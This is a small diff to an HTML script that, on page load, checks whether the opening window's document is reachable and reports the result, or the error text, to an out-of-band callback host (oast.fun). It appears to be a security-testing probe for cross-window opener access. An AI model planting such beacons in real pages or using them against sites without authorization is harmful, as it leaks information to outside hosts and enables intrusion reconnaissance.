@@ -1,8 +1,10 @@
 <script>
+	window.onload = function () {
   try {
     let d = window.opener.document;
     fetch("https://jrnhteacxragwsxmgdxlwnh0wn3hp1vx0.oast.fun/XXXX?opener=" + (!!d));
   } catch (e) {
     fetch("https://jrnhteacxragwsxmgdxlwnh0wn3hp1vx0.oast.fun/XXXX?error=" + encodeURIComponent(e.message));
   }
+	}
 </script>
